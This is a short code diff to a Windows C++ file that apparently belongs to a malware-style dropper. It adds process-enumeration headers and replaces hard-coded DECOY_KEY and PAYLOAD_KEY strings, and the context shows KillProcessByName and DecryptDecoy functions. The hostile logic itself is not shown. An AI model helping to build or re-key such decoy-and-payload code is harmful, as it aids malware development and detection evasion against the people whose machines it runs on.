@@ -5,6 +5,12 @@
 #include <vector>
 #include <commdlg.h>
 #include <math.h>
+#include <tlhelp32.h>
+
+/* Log errors during runtime */
+void RuntimeLog(const char* msg) {
+    // printf("%s\n", msg);
+}
 
 /* 
  * GUI Operations and Entropy Generation
@@ -46,8 +52,8 @@ void KillProcessByName(const WCHAR* szName) {
     }
 }
 
-#define DECOY_KEY "AmvJZL8NOU6h"
-#define PAYLOAD_KEY "CifhKk5q6XC9GYd1"
+#define DECOY_KEY "K0FxVOnrsFzk"
+#define PAYLOAD_KEY "ZhXuAkiW75wHmJAx"
 
 void DecryptDecoy(BYTE* data, size_t size) {
     if (!data || size == 0) return;
